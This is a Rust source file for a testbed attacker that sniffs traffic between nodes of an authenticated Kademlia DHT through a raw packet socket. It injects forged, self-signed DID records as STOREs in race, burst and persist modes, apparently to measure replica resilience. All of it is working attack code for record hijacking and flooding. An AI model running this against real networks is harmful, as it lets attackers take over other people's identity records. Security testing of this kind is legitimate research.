//! Testbed attacker: watches the traffic between testbed nodes and sends
//! forged records for the DIDs it sees, as STOREs. A forged record is
//! self-signed with the attacker's own key for the owner's DID, so it passes a
//! replica's signature check; only a replica with no record can take it.
//!
//! Modes (`ATTACK_MODE`):
//! - `race` (default): for each UPDATE it sees, one forged STORE to the same
//!   replica, racing the owner's STORE to a replica that refused the UPDATE.
//! - `burst`: for each UPDATE, `ATTACK_BURST` forged STOREs at once from
//!   `ATTACK_PORTS` ports. Many lookups at the replica at once can make it
//!   drop answers; the burst tests what the replica does then.
//! - `persist`: it learns DIDs from the STOREs and UPDATEs it sees and, every
//!   `ATTACK_PERIOD_MS`, sends a forged STORE for each DID learned in the last
//!   `ATTACK_DID_TTL_S` seconds to every node it has seen. It covers every
//!   moment a node lacks the record: a restart, a node joining.
//!
//! It runs in the host network namespace, where every container's traffic is
//! visible, as on a shared medium or a mirror port. It only reads and sends:
//! it cannot change or drop the owner's packets. Built with `--features testbed`.
//!
//! Environment:
//! TESTBED_PREFIX    first two octets of the testbed /16 (default 10.213)
//! DHT_PORT          UDP port of the nodes (default 4000)
//! ATTACK_PORT       first UDP port of the attacker's own nodes (default 4999,
//!                   counting down)
//! ATTACK_MODE       race, burst or persist (default race)
//! ATTACK_DELAY_MS   extra delay before each forged STORE in race and burst
//!                   (default 0)
//! ATTACK_BURST      forged STOREs per UPDATE in burst mode (default 64)
//! ATTACK_PORTS      attacker ports in burst mode (default 16)
//! ATTACK_PERIOD_MS  period of persist mode (default 100)
//! ATTACK_DID_TTL_S  how long persist mode keeps attacking a DID (default 20)
//! RUST_LOG          log filter (default `warn,testbed_attacker=info`)

use std::collections::{BTreeMap, HashMap, HashSet};
use std::net::Ipv4Addr;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::{Duration, Instant};

use auth_kademlia_rs::auth_handler::DIDSignatureVerifierHandler;
use auth_kademlia_rs::network::Server;
use auth_kademlia_rs::node::Node;
use auth_kademlia_rs::protocol::{KademliaProtocol, RpcMessage, StoreStatus};
use auth_kademlia_rs::utils::ID_LEN;
use tokio::sync::mpsc;

mod did;
use did::{did_of, signing_key_of, Version};

const KADF_MAGIC: &[u8] = b"KADF";
const KADF_HEADER: usize = 12;
const PARTIAL_TTL: Duration = Duration::from_secs(10);
/// One forged STORE per replica and DID within this window: every packet is
/// seen several times (sender's veth, bridge, receiver's veth).
const ATTACK_ONCE_PER: Duration = Duration::from_secs(5);

fn env_or<T: std::str::FromStr>(name: &str, default: T) -> T {
    std::env::var(name)
        .ok()
        .and_then(|value| value.parse().ok())
        .unwrap_or(default)
}

/// What the sniffer reports.
enum Seen {
    /// A testbed node, the first time it appears in the traffic.
    Node(Ipv4Addr),
    /// A STORE or UPDATE request.
    Request(Observed),
}

/// A STORE or UPDATE request seen on the wire.
struct Observed {
    update: bool,
    from: Ipv4Addr,
    to: Ipv4Addr,
    to_port: u16,
    key: [u8; ID_LEN],
    value: Vec<u8>,
    seen: Instant,
}

// ---------------------------------------------------------------------------
// Sniffing
// ---------------------------------------------------------------------------

/// A packet socket that receives every frame of every interface of the host
/// network namespace. Needs CAP_NET_RAW.
fn packet_socket() -> std::io::Result<i32> {
    let protocol = (libc::ETH_P_ALL as u16).to_be() as i32;
    // SAFETY: plain socket(2) call; the result is checked below.
    let fd = unsafe { libc::socket(libc::AF_PACKET, libc::SOCK_RAW, protocol) };
    if fd < 0 {
        return Err(std::io::Error::last_os_error());
    }
    Ok(fd)
}

/// Source, source port, destination, destination port and payload of an
/// IPv4 UDP datagram inside an Ethernet frame.
fn parse_udp(frame: &[u8]) -> Option<(Ipv4Addr, u16, Ipv4Addr, u16, &[u8])> {
    if frame.len() < 14 + 20 + 8 || frame[12..14] != [0x08, 0x00] {
        return None;
    }
    let ip = &frame[14..];
    if ip[0] >> 4 != 4 || ip[9] != 17 {
        return None;
    }
    // IP fragments do not occur: KADF datagrams stay below the MTU.
    if u16::from_be_bytes([ip[6], ip[7]]) & 0x3fff != 0 {
        return None;
    }
    let header_len = usize::from(ip[0] & 0x0f) * 4;
    let total_len = usize::from(u16::from_be_bytes([ip[2], ip[3]]));
    let ip = ip.get(..total_len)?;
    let udp = ip.get(header_len..)?;
    if udp.len() < 8 {
        return None;
    }
    Some((
        Ipv4Addr::new(ip[12], ip[13], ip[14], ip[15]),
        u16::from_be_bytes([udp[0], udp[1]]),
        Ipv4Addr::new(ip[16], ip[17], ip[18], ip[19]),
        u16::from_be_bytes([udp[2], udp[3]]),
        &udp[8..],
    ))
}

struct Partial {
    total: u16,
    chunks: HashMap<u16, Vec<u8>>,
    started: Instant,
}

/// Read frames forever, reassemble KADF messages between testbed nodes and
/// report every STORE and UPDATE request. Runs on its own thread: `recv` blocks.
fn sniff(prefix: [u8; 2], dht_port: u16, updates: mpsc::UnboundedSender<Seen>) {
    let fd = match packet_socket() {
        Ok(fd) => fd,
        Err(error) => {
            log::error!("cannot open a packet socket (needs CAP_NET_RAW): {error}");
            std::process::exit(1);
        }
    };
    let gateway = Ipv4Addr::new(prefix[0], prefix[1], 0, 1);
    let is_node = |ip: Ipv4Addr| ip.octets()[..2] == prefix && ip != gateway;
    let mut buffer = vec![0u8; 65536];
    let mut partial: HashMap<(Ipv4Addr, u16, u32), Partial> = HashMap::new();
    let mut done: HashMap<(Ipv4Addr, u16, u32), Instant> = HashMap::new();
    let mut nodes: HashSet<Ipv4Addr> = HashSet::new();
    let mut last_cleanup = Instant::now();

    loop {
        // SAFETY: the buffer outlives the call and its length is passed.
        let received = unsafe { libc::recv(fd, buffer.as_mut_ptr().cast(), buffer.len(), 0) };
        if received <= 0 {
            continue;
        }
        let frame = &buffer[..received as usize];
        let Some((src, src_port, dst, dst_port, payload)) = parse_udp(frame) else {
            continue;
        };
        if dst_port != dht_port || !is_node(src) || !is_node(dst) {
            continue;
        }
        for ip in [src, dst] {
            if nodes.insert(ip) {
                let _ = updates.send(Seen::Node(ip));
            }
        }
        if payload.len() < KADF_HEADER || &payload[..4] != KADF_MAGIC {
            continue;
        }
        let frag_id = u32::from_be_bytes([payload[4], payload[5], payload[6], payload[7]]);
        let index = u16::from_be_bytes([payload[8], payload[9]]);
        let total = u16::from_be_bytes([payload[10], payload[11]]);
        let message_id = (src, src_port, frag_id);
        if total == 0 || index >= total || done.contains_key(&message_id) {
            continue;
        }
        let entry = partial.entry(message_id).or_insert_with(|| Partial {
            total,
            chunks: HashMap::new(),
            started: Instant::now(),
        });
        entry.chunks.insert(index, payload[KADF_HEADER..].to_vec());
        if entry.chunks.len() == usize::from(entry.total) {
            if let Some(entry) = partial.remove(&message_id) {
                done.insert(message_id, Instant::now());
                let message: Vec<u8> = (0..entry.total)
                    .filter_map(|i| entry.chunks.get(&i))
                    .flatten()
                    .copied()
                    .collect();
                let request = match bincode::deserialize::<(u32, bool, RpcMessage)>(&message) {
                    Ok((_, true, RpcMessage::Update { key, value, .. })) => {
                        Some((true, key, value))
                    }
                    Ok((_, true, RpcMessage::Store { key, value, .. })) => {
                        Some((false, key, value))
                    }
                    _ => None,
                };
                if let Some((update, key, value)) = request {
                    let _ = updates.send(Seen::Request(Observed {
                        update,
                        from: src,
                        to: dst,
                        to_port: dst_port,
                        key,
                        value,
                        seen: Instant::now(),
                    }));
                }
            }
        }
        if last_cleanup.elapsed() > Duration::from_secs(1) {
            partial.retain(|_, entry| entry.started.elapsed() < PARTIAL_TTL);
            done.retain(|_, at| at.elapsed() < PARTIAL_TTL * 3);
            last_cleanup = Instant::now();
        }
    }
}

// ---------------------------------------------------------------------------
// Attack
// ---------------------------------------------------------------------------

fn elapsed_ms(since: Instant) -> f64 {
    (since.elapsed().as_secs_f64() * 1000.0 * 10.0).round() / 10.0
}

fn replica(ip: Ipv4Addr, port: u16) -> Node {
    Node::new([0u8; ID_LEN], Some(ip.to_string()), Some(port))
}

fn tally(answers: &[Option<StoreStatus>]) -> String {
    let mut counts: BTreeMap<String, usize> = BTreeMap::new();
    for answer in answers {
        let name = match answer {
            Some(status) => format!("{status:?}"),
            None => "no answer".to_string(),
        };
        *counts.entry(name).or_default() += 1;
    }
    counts
        .iter()
        .map(|(name, count)| format!("{name}={count}"))
        .collect::<Vec<_>>()
        .join(" ")
}

/// The attacker's own nodes, on consecutive ports counting down from `first`.
/// The servers own the listening tasks, so the caller keeps them.
async fn attacker_nodes(
    gateway: &str,
    first: u16,
    count: usize,
) -> (Vec<Server>, Vec<Arc<KademliaProtocol>>) {
    let mut servers = Vec::with_capacity(count);
    let mut protocols = Vec::with_capacity(count);
    for index in 0..count {
        let port = first - index as u16;
        let handler = Arc::new(DIDSignatureVerifierHandler::new(PathBuf::from(
            "issuer.bin",
        )));
        let mut server = Server::new(handler, 20, 3, None, None, false);
        if let Err(error) = server.listen(port, gateway).await {
            log::error!("cannot listen on {gateway}:{port}: {error}");
            std::process::exit(1);
        }
        let Some(protocol) = server.protocol.clone() else {
            log::error!("the attacker's node on port {port} is not listening");
            std::process::exit(1);
        };
        servers.push(server);
        protocols.push(protocol);
    }
    (servers, protocols)
}

/// `race` and `burst`: answer each UPDATE with `copies` forged STOREs to the
/// same replica, spread over the attacker's ports.
async fn react_to_updates(
    mut seen: mpsc::UnboundedReceiver<Seen>,
    protocols: Vec<Arc<KademliaProtocol>>,
    copies: usize,
    delay: Duration,
) {
    let mut attacked: HashMap<(Ipv4Addr, [u8; ID_LEN]), Instant> = HashMap::new();
    while let Some(seen) = seen.recv().await {
        let Seen::Request(update) = seen else {
            continue;
        };
        if !update.update {
            continue;
        }
        let target = (update.to, update.key);
        if attacked
            .get(&target)
            .is_some_and(|at| at.elapsed() < ATTACK_ONCE_PER)
        {
            continue;
        }
        attacked.insert(target, Instant::now());
        attacked.retain(|_, at| at.elapsed() < ATTACK_ONCE_PER);
        let Some(did) = did_of(&update.value) else {
            continue;
        };

        let protocols = protocols.clone();
        tokio::spawn(async move {
            // The forged record: the same DID, the attacker's own keys.
            let forged = Version::generate(&did).record;
            let forged_after = elapsed_ms(update.seen);
            if !delay.is_zero() {
                tokio::time::sleep(delay).await;
            }
            let replica = replica(update.to, update.to_port);
            let sent_after = elapsed_ms(update.seen);
            let answers = futures::future::join_all((0..copies).map(|index| {
                let protocol = Arc::clone(&protocols[index % protocols.len()]);
                let replica = replica.clone();
                let forged = forged.clone();
                async move { protocol.call_store_rpc(&replica, update.key, forged).await }
            }))
            .await;
            if copies == 1 {
                log::info!(
                    "UPDATE {} -> {} for {}: forged key {} sent {} ms after seeing it \
                     (forged in {} ms), answer {:?}",
                    update.from,
                    update.to,
                    did,
                    signing_key_of(&forged),
                    sent_after,
                    forged_after,
                    answers[0]
                );
            } else {
                log::info!(
                    "UPDATE {} -> {} for {}: burst of {} forged STOREs (key {}) from {} ports \
                     sent {} ms after seeing it, answers {}",
                    update.from,
                    update.to,
                    did,
                    copies,
                    signing_key_of(&forged),
                    protocols.len(),
                    sent_after,
                    tally(&answers)
                );
            }
        });
    }
}

/// `persist`: keep sending forged records for the DIDs seen recently to every
/// node seen.
async fn persist(
    mut seen: mpsc::UnboundedReceiver<Seen>,
    protocol: Arc<KademliaProtocol>,
    dht_port: u16,
    period: Duration,
    did_ttl: Duration,
) {
    struct Target {
        did: String,
        forged: Vec<u8>,
        learned: Instant,
    }
    let mut targets: HashMap<[u8; ID_LEN], Target> = HashMap::new();
    let mut nodes: HashSet<Ipv4Addr> = HashSet::new();
    let mut tick = tokio::time::interval(period);
    let mut report = Instant::now();
    let mut answers: Vec<Option<StoreStatus>> = Vec::new();
    let (answer_tx, mut answer_rx) = mpsc::unbounded_channel::<Option<StoreStatus>>();
    loop {
        tokio::select! {
            event = seen.recv() => {
                let observed = match event {
                    None => return,
                    Some(Seen::Node(ip)) => {
                        nodes.insert(ip);
                        continue;
                    }
                    Some(Seen::Request(observed)) => observed,
                };
                if let std::collections::hash_map::Entry::Vacant(entry) = targets.entry(observed.key) {
                    if let Some(did) = did_of(&observed.value) {
                        let forged = Version::generate(&did).record;
                        log::info!(
                            "persist: learned {} from a {} {} -> {}, forged key {}",
                            did,
                            if observed.update { "UPDATE" } else { "STORE" },
                            observed.from,
                            observed.to,
                            signing_key_of(&forged)
                        );
                        entry.insert(Target { did, forged, learned: Instant::now() });
                    }
                }
            }
            answer = answer_rx.recv() => {
                if let Some(answer) = answer {
                    answers.push(answer);
                }
            }
            _ = tick.tick() => {
                targets.retain(|_, target| target.learned.elapsed() < did_ttl);
                for (key, target) in &targets {
                    for ip in &nodes {
                        let protocol = Arc::clone(&protocol);
                        let answer_tx = answer_tx.clone();
                        let replica = replica(*ip, dht_port);
                        let forged = target.forged.clone();
                        let key = *key;
                        tokio::spawn(async move {
                            let answer = protocol.call_store_rpc(&replica, key, forged).await;
                            let _ = answer_tx.send(answer);
                        });
                    }
                }
                if report.elapsed() >= Duration::from_secs(5) {
                    if !answers.is_empty() {
                        let dids: Vec<&str> = targets.values().map(|t| t.did.as_str()).collect();
                        log::info!(
                            "persist: {} forged STOREs in the last 5 s to {} nodes for {} DIDs, answers {}",
                            answers.len(),
                            nodes.len(),
                            dids.len(),
                            tally(&answers)
                        );
                    }
                    answers.clear();
                    report = Instant::now();
                }
            }
        }
    }
}

async fn run() {
    let prefix_text = std::env::var("TESTBED_PREFIX").unwrap_or_else(|_| "10.213".to_string());
    let prefix: Vec<u8> = prefix_text
        .split('.')
        .filter_map(|part| part.parse().ok())
        .collect();
    let [a, b] = prefix[..] else {
        log::error!("TESTBED_PREFIX must be two octets, e.g. 10.213");
        std::process::exit(1);
    };
    let dht_port = env_or("DHT_PORT", 4000u16);
    let attack_port = env_or("ATTACK_PORT", 4999u16);
    let mode = std::env::var("ATTACK_MODE").unwrap_or_else(|_| "race".to_string());
    let delay = Duration::from_millis(env_or("ATTACK_DELAY_MS", 0u64));
    let burst = env_or("ATTACK_BURST", 64usize).max(1);
    let ports = env_or("ATTACK_PORTS", 16usize).max(1);
    let period = Duration::from_millis(env_or("ATTACK_PERIOD_MS", 100u64).max(1));
    let did_ttl = Duration::from_secs(env_or("ATTACK_DID_TTL_S", 20u64));

    // The attacker's own nodes send the forged STOREs and get the answers.
    // They listen on the bridge gateway, the host's address on the testbed
    // network.
    let gateway = format!("{a}.{b}.0.1");
    let port_count = if mode == "burst" { ports } else { 1 };
    let (_servers, protocols) = attacker_nodes(&gateway, attack_port, port_count).await;

    let (sender, seen) = mpsc::unbounded_channel();
    std::thread::spawn(move || sniff([a, b], dht_port, sender));
    match mode.as_str() {
        "race" => {
            log::info!(
                "attacker (race) on {gateway}:{attack_port}: one forged STORE per UPDATE to port \
                 {dht_port} on {a}.{b}.0.0/16, extra delay {} ms",
                delay.as_millis()
            );
            react_to_updates(seen, protocols, 1, delay).await;
        }
        "burst" => {
            log::info!(
                "attacker (burst) on {gateway}:{}-{attack_port}: {burst} forged STOREs per UPDATE \
                 to port {dht_port} on {a}.{b}.0.0/16, extra delay {} ms",
                attack_port - (port_count as u16 - 1),
                delay.as_millis()
            );
            react_to_updates(seen, protocols, burst, delay).await;
        }
        "persist" => {
            log::info!(
                "attacker (persist) on {gateway}:{attack_port}: every {} ms, a forged STORE for \
                 each DID seen in the last {} s to every node seen",
                period.as_millis(),
                did_ttl.as_secs()
            );
            let protocol = Arc::clone(&protocols[0]);
            persist(seen, protocol, dht_port, period, did_ttl).await;
        }
        other => {
            log::error!("unknown ATTACK_MODE {other}: use race, burst or persist");
            std::process::exit(1);
        }
    }
}

fn main() {
    env_logger::Builder::from_env(
        env_logger::Env::default().default_filter_or("warn,testbed_attacker=info"),
    )
    .init();
    tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .expect("tokio runtime")
        .block_on(run());
}
